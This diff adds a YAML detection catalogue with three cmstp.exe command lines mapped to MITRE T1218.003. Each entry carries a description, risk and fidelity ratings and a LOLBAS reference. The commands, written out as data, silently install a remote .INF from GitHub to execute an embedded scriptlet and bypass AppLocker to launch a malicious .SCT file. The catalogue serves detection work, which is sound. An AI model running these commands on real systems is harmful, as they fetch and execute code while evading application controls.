@@ -1,0 +1,57 @@
+- command: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+  description: Execute a .SCT file contained or downloaded from within the given .inf file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.003
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
+  risk: High
+  risk_reason: Using cmstp in this manner is typically an extremely rare action for most users.
+  fidelity: High
+  fidelity_reason: This type of activity is extremely rare for the vast majority of organizations.
+  tool: cmstp
+  threatactors:
+    N/A:
+      - N/A
+- command: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
+  description: Silently install a remote .INF without icons and execute the embedded .SCT file using scrobj.dll.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.003
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
+  risk: High
+  risk_reason: Using cmstp in this manner is typically an extremely rare action for most users.
+  fidelity: High
+  fidelity_reason: This type of activity is extremely rare for the vast majority of organizations.
+  tool: cmstp
+  threatactors:
+    N/A:
+      - N/A
+- command: cmstp.exe /s /ns C:\Users\ADMINI~W\AppData\Local\Temp\XKNqbpzl.txt
+  description: Bypass AppLocker to launch a malicious .SCT script contained in the specified .txt file.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.003
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
+  risk: High
+  risk_reason: Using cmstp in this manner is typically an extremely rare action for most users.
+  fidelity: High
+  fidelity_reason: This type of activity is extremely rare for the vast majority of organizations.
+  tool: cmstp
+  threatactors:
+    N/A:
+      - N/A
